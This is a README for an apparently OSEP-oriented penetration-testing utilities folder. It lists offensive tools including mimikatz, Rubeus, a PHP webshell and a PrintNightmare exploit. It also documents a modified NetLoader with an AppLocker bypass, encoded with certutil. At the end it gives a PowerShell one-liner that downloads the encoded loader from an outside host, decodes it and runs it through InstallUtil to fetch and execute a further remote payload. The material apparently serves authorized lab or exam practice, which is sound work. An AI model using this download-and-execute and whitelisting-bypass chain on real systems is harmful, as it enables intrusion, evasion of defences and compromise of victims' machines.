# Utils

This folder is copied to the folder where the script is executed, so you can add different tools and scripts to always have them handy on the same web server.

Below are the links to the main tools I have used in this folder. 

- [PowerUp](https://github.com/HarmJ0y/PowerUp)

- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

- [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

- [PrivescCheck](https://github.com/itm4n/PrivescCheck)

- [SharpHound](https://github.com/SpecterOps/SharpHound)

- [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)

- [easy-simple-php-webshell.php](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)

- [Rubeus](https://github.com/GhostPack/Rubeus)

- [NetLoader](https://github.com/Flangvik/NetLoader/)

- [PEASS-ng](https://github.com/peass-ng/PEASS-ng)

- [CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)

- [pspy](https://github.com/DominicBreuker/pspy)

- [mimikatz](https://github.com/gentilkiwi/mimikatz)

- [SharpCollection](https://github.com/Flangvik/SharpCollection)

## enc.txt

`enc.txt` is a modified version of [NetLoader](https://github.com/Flangvik/NetLoader) modified mixed with ["AppLocker Bypass PowerShell Runspace"](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/AppLocker%20Bypass%20PowerShell%20Runspace), the code is in `NetLoaderModified.cs`. 

> Note: The modification is a bit sloppy, but the idea was to make a functional and fast binary so I wouldn't have to recompile it. Please, if anyone fixes it, send me a PR. 

The file is compilled with:

``` cs
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:b.exe  /r:"C:\windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" .\NetLoaderModified.cs
```

And encoded with certutil. 
```
Certutil -encode b.exe enc.txt
```


``` powershell
powershell iwr -uri http://192.168.45.90:8080/enc.txt -outfile C:\\windows\\Tasks\\enc.txt;powershell rm C:\\windows\\Tasks\\proc.exe;powershell certutil -decode C:\\windows\\Tasks\\enc.txt C:\\windows\\Tasks\\proc.exe; C:\\windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /path=http://192.168.45.90:8080/apollo-osep.exe /U C:\\windows\\Tasks\\proc.exe
```

> note: the `/path=http://192.168.45.90:8080/apollo-osep.exe` is for the  NetLoader only, TODO rest of parameters